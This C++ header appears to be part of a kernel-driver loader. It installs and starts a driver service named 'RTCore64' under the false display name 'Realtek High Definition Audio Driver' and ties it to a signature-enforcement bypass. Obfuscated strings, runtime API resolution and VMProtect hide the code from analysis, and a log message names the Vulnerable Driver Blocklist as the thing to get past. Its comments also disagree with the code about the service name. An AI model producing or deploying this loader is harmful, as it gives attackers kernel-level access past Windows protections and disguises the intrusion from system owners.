#pragma once
#include "includes.hpp"
#include "kvc_drv.hpp"
#include "dse_bypass.hpp"
#include "log.hpp"
#include "VMProtectSDK.h"   // VMProtect 3.x SDK
#include <filesystem>

//=============================================================================
//  kvc_session.hpp  –  kvc.sys helper driver lifecycle
//
//  Translated from kvc-main:
//    ControllerDriverManager.cpp  → InstallDriver / StartDriverService /
//                                   StopDriverService / UninstallDriver /
//                                   ForceRemoveService
//    ControllerCore.cpp           → BeginDriverSession / EndDriverSession /
//                                   PerformAtomicCleanup
//
//  The kvc.sys binary must be present on disk.
//  Default search order (relative to loader .exe):
//    1.  .\kvc.sys
//    2.  ..\driver loader\bin\x64\Release\kvc.sys   (kvc-main default output)
//    3.  Any path you pass explicitly to BeginSession()
//
//  Service name: L"KernelVulnerabilityControl"
//    (mirrors ServiceConstants::SERVICE_NAME from kvc common.h;
//     the original name is stored in MmPoolTelemetry.asm obfuscated,
//     but matches this value in all public builds of kvc-main)
//=============================================================================

namespace kvc_session {

// ─── service name (obfuscated at compile time, decrypted at each call site) ────
//  RTCore64 = MmGetPoolDiagnosticString() decoded (XOR 0x37C5 → ROL4 → -0x15A2)
inline const wchar_t* KVC_SVC_NAME() noexcept { return WOBF( L"RTCore64" ); }
inline const wchar_t* KVC_SVC_DISP() noexcept { return WOBF( L"Realtek High Definition Audio Driver" ); }

// ─── forward declared helper ──────────────────────────────────────────────────
inline std::wstring format_err( DWORD code )
{
    wchar_t* buf = nullptr;
    FormatMessageW( FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
                    FORMAT_MESSAGE_IGNORE_INSERTS,
                    nullptr, code, MAKELANGID( LANG_NEUTRAL, SUBLANG_DEFAULT ),
                    reinterpret_cast<LPWSTR>( &buf ), 0, nullptr );
    std::wstring s = buf ? buf : L"";
    LocalFree( buf );
    while ( !s.empty() && ( s.back() == L'\n' || s.back() == L'\r' ) )
        s.pop_back();
    return s;
}

//─────────────────────────────── dynamic API init ─────────────────────────────
//  Mirrors common.cpp InitDynamicAPIs() exactly.
//  kvc: runtime-resolves all SCM + CreateFileW via GetProcAddress.

inline decltype( &OpenSCManagerW )  g_pOpenSCManagerW  = nullptr;
inline decltype( &CloseServiceHandle ) g_pCloseServiceHandle = nullptr;
inline decltype( &CreateServiceW )  g_pCreateServiceW  = nullptr;
inline decltype( &OpenServiceW )    g_pOpenServiceW    = nullptr;
inline decltype( &StartServiceW )   g_pStartServiceW   = nullptr;
inline decltype( &DeleteService )   g_pDeleteService   = nullptr;
inline decltype( &ControlService )  g_pControlService  = nullptr;
inline decltype( &CreateFileW )        g_pCreateFileW        = nullptr;
inline decltype( &QueryServiceStatus ) g_pQueryServiceStatus = nullptr;
inline HMODULE                         g_advapi32            = nullptr;

__declspec(noinline) inline bool InitDynamicAPIs() noexcept
{
    VMProtectBeginUltra( "kvc_session::InitDynamicAPIs" );
    if ( !g_advapi32 ) {
        g_advapi32 = ::LoadLibraryA( OBF( "advapi32.dll" ) );
        if ( !g_advapi32 ) return false;

        g_pOpenSCManagerW     = reinterpret_cast<decltype( &OpenSCManagerW )>(
            ::GetProcAddress( g_advapi32, OBF( "OpenSCManagerW" ) ) );
        g_pCloseServiceHandle = reinterpret_cast<decltype( &CloseServiceHandle )>(
            ::GetProcAddress( g_advapi32, OBF( "CloseServiceHandle" ) ) );
        g_pCreateServiceW = reinterpret_cast<decltype( &CreateServiceW )>(
            ::GetProcAddress( g_advapi32, OBF( "CreateServiceW" ) ) );
        g_pOpenServiceW   = reinterpret_cast<decltype( &OpenServiceW )>(
            ::GetProcAddress( g_advapi32, OBF( "OpenServiceW" ) ) );
        g_pStartServiceW  = reinterpret_cast<decltype( &StartServiceW )>(
            ::GetProcAddress( g_advapi32, OBF( "StartServiceW" ) ) );
        g_pDeleteService  = reinterpret_cast<decltype( &DeleteService )>(
            ::GetProcAddress( g_advapi32, OBF( "DeleteService" ) ) );
        g_pControlService = reinterpret_cast<decltype( &ControlService )>(
            ::GetProcAddress( g_advapi32, OBF( "ControlService" ) ) );
        g_pQueryServiceStatus = reinterpret_cast<decltype( &QueryServiceStatus )>(
            ::GetProcAddress( g_advapi32, OBF( "QueryServiceStatus" ) ) );

        if ( !g_pOpenSCManagerW   || !g_pCloseServiceHandle ||
             !g_pCreateServiceW   || !g_pOpenServiceW || !g_pStartServiceW ||
             !g_pDeleteService    || !g_pControlService || !g_pQueryServiceStatus )
            return false;
    }

    if ( !g_pCreateFileW ) {
        HMODULE k32 = ::GetModuleHandleA( OBF( "kernel32.dll" ) );
        if ( !k32 ) return false;
        g_pCreateFileW = reinterpret_cast<decltype( &CreateFileW )>(
            ::GetProcAddress( k32, OBF( "CreateFileW" ) ) );
        if ( !g_pCreateFileW ) { VMProtectEnd(); return false; }
    }

    VMProtectEnd();
    return true;
}

//─────────────────────────────── zombie detection ─────────────────────────────
//  kvc: IsServiceZombie() – marked-for-delete but not yet removed

inline bool IsZombie() noexcept
{
    if ( !InitDynamicAPIs() ) return false;
    SC_HANDLE hSCM = g_pOpenSCManagerW( nullptr, nullptr, SC_MANAGER_CONNECT );
    if ( !hSCM ) return false;
    SC_HANDLE hSvc = g_pOpenServiceW( hSCM, KVC_SVC_NAME(), DELETE );
    if ( !hSvc ) {
        g_pCloseServiceHandle( hSCM );
        return false;
    }
    BOOL del = g_pDeleteService( hSvc );
    DWORD err = ::GetLastError();
    g_pCloseServiceHandle( hSvc );
    g_pCloseServiceHandle( hSCM );
    return ( !del && err == ERROR_SERVICE_MARKED_FOR_DELETE );
}

//─────────────────────────────── force remove ─────────────────────────────────
//  kvc: ForceRemoveService() – stop + delete regardless of errors

inline bool ForceRemoveService() noexcept
{
    if ( !InitDynamicAPIs() ) return false;

    // Stop first
    {
        SC_HANDLE hSCM = g_pOpenSCManagerW( nullptr, nullptr, SC_MANAGER_CONNECT );
        if ( hSCM ) {
            SC_HANDLE hSvc = g_pOpenServiceW( hSCM, KVC_SVC_NAME(),
                                              SERVICE_STOP | SERVICE_QUERY_STATUS );
            if ( hSvc ) {
                SERVICE_STATUS ss{};
                if ( g_pQueryServiceStatus( hSvc, &ss ) &&
                     ss.dwCurrentState == SERVICE_RUNNING ) {
                    g_pControlService( hSvc, SERVICE_CONTROL_STOP, &ss );
                }
                g_pCloseServiceHandle( hSvc );
            }
            g_pCloseServiceHandle( hSCM );
        }
    }

    // Delete
    SC_HANDLE hSCM = g_pOpenSCManagerW( nullptr, nullptr, SC_MANAGER_CONNECT );
    if ( !hSCM ) return false;
    SC_HANDLE hSvc = g_pOpenServiceW( hSCM, KVC_SVC_NAME(), DELETE );
    if ( !hSvc ) {
        DWORD e = ::GetLastError();
        g_pCloseServiceHandle( hSCM );
        return ( e == ERROR_SERVICE_DOES_NOT_EXIST );
    }
    BOOL ok  = g_pDeleteService( hSvc );
    DWORD de = ::GetLastError();
    g_pCloseServiceHandle( hSvc );
    g_pCloseServiceHandle( hSCM );
    return ok || ( de == ERROR_SERVICE_MARKED_FOR_DELETE );
}

//─────────────────────────────── install ──────────────────────────────────────
//  kvc: InstallDriver() – write kvc.sys, CreateService
//  For our loader: kvc.sys is already on disk; skip TrustedInstaller write.

inline bool Install( const std::wstring& sysPath ) noexcept
{
    ForceRemoveService();

    if ( IsZombie() ) {
        dlog::write( L"[kvc_session::Install] FAIL – service is zombie (reboot required)" );
        return false;
    }

    if ( !std::filesystem::exists( sysPath ) ) {
        dlog::write( wfmt( WOBFS( L"[kvc_session::Install] FAIL \u2013 kvc.sys not found at: {}" ), sysPath ) );
        return false;
    }
    if ( !InitDynamicAPIs() ) {
        dlog::write( L"[kvc_session::Install] FAIL – InitDynamicAPIs failed" );
        return false;
    }

    SC_HANDLE hSCM = g_pOpenSCManagerW( nullptr, nullptr, SC_MANAGER_ALL_ACCESS );
    if ( !hSCM ) {
        dlog::write( wfmt( WOBFS( L"[kvc_session::Install] FAIL \u2013 OpenSCManagerW error {}" ), ::GetLastError() ) );
        return false;
    }

    SC_HANDLE hSvc = g_pCreateServiceW(
        hSCM,
        KVC_SVC_NAME(),
        KVC_SVC_DISP(),
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        sysPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr );

    DWORD ce = ::GetLastError();
    if ( hSvc ) g_pCloseServiceHandle( hSvc );
    g_pCloseServiceHandle( hSCM );

    if ( !hSvc && ce != ERROR_SERVICE_EXISTS ) {
        dlog::write( wfmt( WOBFS( L"[kvc_session::Install] FAIL \u2013 CreateServiceW error {} (path: {})" ), ce, sysPath ) );
        return false;
    }
    dlog::write( wfmt( WOBFS( L"[kvc_session::Install] OK \u2013 path: {}" ), sysPath ) );
    return true;
}

//─────────────────────────────── start ───────────────────────────────────────
//  kvc: StartDriverService() – open + StartServiceW

inline bool Start() noexcept
{
    if ( !InitDynamicAPIs() ) return false;

    SC_HANDLE hSCM = g_pOpenSCManagerW( nullptr, nullptr, SC_MANAGER_ALL_ACCESS );
    if ( !hSCM ) return false;

    SC_HANDLE hSvc = g_pOpenServiceW( hSCM, KVC_SVC_NAME(),
                                      SERVICE_START | SERVICE_QUERY_STATUS );
    if ( !hSvc ) {
        g_pCloseServiceHandle( hSCM );
        return false;
    }

    SERVICE_STATUS ss{};
    if ( g_pQueryServiceStatus( hSvc, &ss ) &&
         ss.dwCurrentState == SERVICE_RUNNING ) {
        g_pCloseServiceHandle( hSvc );
        g_pCloseServiceHandle( hSCM );
        return true;
    }

    BOOL ok  = g_pStartServiceW( hSvc, 0, nullptr );
    DWORD e  = ::GetLastError();
    g_pCloseServiceHandle( hSvc );
    g_pCloseServiceHandle( hSCM );

    if ( !ok && e != ERROR_SERVICE_ALREADY_RUNNING ) {
        dlog::write( wfmt( WOBFS( L"[kvc_session::Start] FAIL \u2013 StartServiceW error {} ({}) \u2013 check Windows Defender / Vulnerable Driver Blocklist" ),
                         e, WOBFS( L"RTCore64" ) ) );
        return false;
    }
    dlog::write( std::wstring( L"[kvc_session::Start] OK – " ) + WOBFS( L"RTCore64" ) + L" running" );
    return true;
}

//─────────────────────────────── stop ────────────────────────────────────────
//  kvc: StopDriverService() – ControlService(STOP)

inline bool Stop() noexcept
{
    if ( !InitDynamicAPIs() ) return false;

    SC_HANDLE hSCM = g_pOpenSCManagerW( nullptr, nullptr, SC_MANAGER_CONNECT );
    if ( !hSCM ) return false;

    SC_HANDLE hSvc = g_pOpenServiceW( hSCM, KVC_SVC_NAME(),
                                      SERVICE_STOP | SERVICE_QUERY_STATUS );
    if ( !hSvc ) {
        DWORD e = ::GetLastError();
        g_pCloseServiceHandle( hSCM );
        return e == ERROR_SERVICE_DOES_NOT_EXIST;
    }

    SERVICE_STATUS ss{};
    if ( !g_pQueryServiceStatus( hSvc, &ss ) ) {
        g_pCloseServiceHandle( hSvc );
        g_pCloseServiceHandle( hSCM );
        return false;
    }

    bool ok = true;
    if ( ss.dwCurrentState == SERVICE_RUNNING ) {
        if ( !g_pControlService( hSvc, SERVICE_CONTROL_STOP, &ss ) ) {
            DWORD e = ::GetLastError();
            if ( e != ERROR_SERVICE_NOT_ACTIVE ) ok = false;
        }
    }
    g_pCloseServiceHandle( hSvc );
    g_pCloseServiceHandle( hSCM );
    return ok;
}

//─────────────────────────────── uninstall ────────────────────────────────────
//  kvc: UninstallDriver() – Stop + DeleteService

inline bool Uninstall() noexcept
{
    Stop();
    if ( !InitDynamicAPIs() ) return true;

    SC_HANDLE hSCM = g_pOpenSCManagerW( nullptr, nullptr, SC_MANAGER_ALL_ACCESS );
    if ( !hSCM ) return true;

    SC_HANDLE hSvc = g_pOpenServiceW( hSCM, KVC_SVC_NAME(), DELETE );
    if ( !hSvc ) {
        DWORD e = ::GetLastError();
        g_pCloseServiceHandle( hSCM );
        return e == ERROR_SERVICE_DOES_NOT_EXIST;
    }

    BOOL ok  = g_pDeleteService( hSvc );
    DWORD de = ::GetLastError();
    g_pCloseServiceHandle( hSvc );
    g_pCloseServiceHandle( hSCM );

    return ok || de == ERROR_SERVICE_MARKED_FOR_DELETE;
}

//──────────────────────────── PerformAtomicCleanup ────────────────────────────
//  kvc: PerformAtomicCleanup() – clean leftover kvc.sys service before each op

inline void PerformAtomicCleanup() noexcept
{
    ForceRemoveService();
}

//──────────────────────────── resolve kvc.sys path ────────────────────────────
inline std::wstring FindKvcSys() noexcept
{
    wchar_t exeDir[MAX_PATH];
    ::GetModuleFileNameW( nullptr, exeDir, MAX_PATH );
    // Remove file name → directory
    for ( int i = static_cast<int>( wcslen( exeDir ) ) - 1; i >= 0; --i ) {
        if ( exeDir[i] == L'\\' || exeDir[i] == L'/' ) {
            exeDir[i] = L'\0';
            break;
        }
    }

    const std::wstring candidates[] = {
        // 1. Next to loader .exe  (e.g. bin\Release\kvc.sys)
        std::wstring( exeDir ) + L"\\kvc.sys",
        // 2. Project root – one level up from bin\  (bin\Release → bin → proj)
        std::wstring( exeDir ) + L"\\..\\..\\kvc.sys",
        // 3. Project root via Debug path  (bin\Debug → ...)
        std::wstring( exeDir ) + L"\\..\\kvc.sys",
        // 4. kvc-main default x64 Release output relative to our project
        std::wstring( exeDir ) + L"\\..\\..\\..\\..\\..\\..\\kvc-main\\kvc-main\\x64\\Release\\kvc.sys",
        // 5. driver loader bin dir (if built from kvc-main)
        std::wstring( exeDir ) + L"\\..\\driver loader\\bin\\x64\\Release\\kvc.sys",
    };

    for ( const auto& p : candidates ) {
        wchar_t canonical[MAX_PATH];
        ::GetFullPathNameW( p.c_str(), MAX_PATH, canonical, nullptr );
        if ( ::GetFileAttributesW( canonical ) != INVALID_FILE_ATTRIBUTES )
            return canonical;
    }
    return L"";
}

//─────────────────────────────── BeginSession ─────────────────────────────────
//  kvc: BeginDriverSession() – install + start + connect kvc object
//
//  sysPath: optional override; if empty, FindKvcSys() is used
//  Returns: initialized kvc driver object (check IsConnected())

struct Session {
    kvc        driver;
    dse_bypass dse { driver };
    bool       active = false;
};

__declspec(noinline) inline bool BeginSession( Session& s, std::wstring sysPath = L"" ) noexcept
{
    VMProtectBeginUltra( "kvc_session::BeginSession" );
    if ( sysPath.empty() ) sysPath = FindKvcSys();
    if ( sysPath.empty() ) {
        dlog::write( L"[kvc_session::BeginSession] FAIL \u2013 kvc.sys not found in any candidate path" );
        VMProtectEnd();
        return false;
    }
    dlog::write( wfmt( WOBFS( L"[kvc_session::BeginSession] kvc.sys path: {}" ), sysPath ) );

    PerformAtomicCleanup();

    if ( !Install( sysPath ) ) return false;
    if ( !Start()            ) return false;

    s.driver.SetServiceName( KVC_SVC_NAME() );
    if ( !s.driver.Initialize() ) {
        dlog::write( wfmt( WOBFS( L"[kvc_session::BeginSession] FAIL \u2013 kvc driver Initialize() failed (CreateFileW error {})" ),
                         ::GetLastError() ) );
        Stop();
        Uninstall();
        return false;
    }

    dlog::write( L"[kvc_session::BeginSession] OK – kvc device connected" );
    s.active = true;    VMProtectEnd();    return true;
}

//─────────────────────────────── EndSession ───────────────────────────────────
//  kvc: EndDriverSession(bool removeDriver)
//  removeDriver=true  → close handle + stop + uninstall kvc.sys
//  removeDriver=false → close handle only (kvc.sys stays for next use)

__declspec(noinline) inline void EndSession( Session& s, bool removeDriver = true ) noexcept
{
    VMProtectBeginMutation( "kvc_session::EndSession" );
    s.driver.Cleanup();
    s.active = false;
    if ( removeDriver ) {
        Stop();
        Uninstall();
    }
    VMProtectEnd();
}

} // namespace kvc_session
